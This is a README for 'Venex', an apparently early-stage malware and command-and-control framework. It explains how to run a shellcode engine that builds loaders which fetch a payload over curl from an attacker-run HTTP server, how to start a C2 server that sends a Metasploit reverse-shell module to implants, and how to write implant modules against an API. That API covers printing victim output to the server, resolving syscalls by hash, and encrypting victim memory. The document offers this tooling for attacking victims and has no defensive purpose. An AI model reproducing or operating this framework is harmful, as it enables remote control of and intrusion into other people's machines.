# Venex
;first i want to say you my english is not perfect
;this is 0.2 test version we will upgrade

## HOW DO I USE THIS
;first we will look at file structers or user im not gonne tell you sorce code if you are new to hacking dont look at /gostinit
;your role is mostly inside /tools/bin this contain all tool you need

;encrypt.exe --> dont touch unless you make module for this
;obufcater.exe --> dont touch unless you make module for this
;hash.exe --> dont touch unless you make module for this
;gostmsf.exe --> this is the tool you can generate shellcode(not just a shellcode it is core we call it shellcode engine), test/debug loader

## HOW DO I USE gostmsf (msf mean not metasploit just chill)
;just run ./gostmsf.exe "c2 Ip adress port is 80" "curl string for loader ex: http://99.88.77.66:5555/core.bin" then you will see things
;core part is store inside /xMain/core/core.bin run http server inside /xMain/core/ for example : python -m http.server 5555 

;then run c2 /server/server.exe this is not full server simple testing server just send encrypted module(not safe module just msf revshellcode 74 byte) to core

## HOW DO I MAKE MODULES FOR THIS (< 512b)

;this is proved a function remember this is version 0.1 still test stage it mean only few functions
;every function have MBA(module base adress) it mean if adress is function adress is -5
;you can aceess it from your module start rip-5


;gostPrint(&message,len):0xFFFFF9CD this is printf but print victim output on server

;gostGetSyscall(syscallhash):0xFFFFF95A you dont need to do mov rax,syscallnumber alway use this

;gostEXESyscall():0xFFFFFA8E you dont need to hardcode syscall instruction just call gostEXESyscall()

;gostEncrypt(&buffer,len):0xFFFFFAA6 you can encrypt eny memory value inside victime memory

;WARNING: gostPrint() is internely encrypt data you can pass unencrypted string

;after compiled binary sing with signatuer or turn on dinamicaly sign on server.exe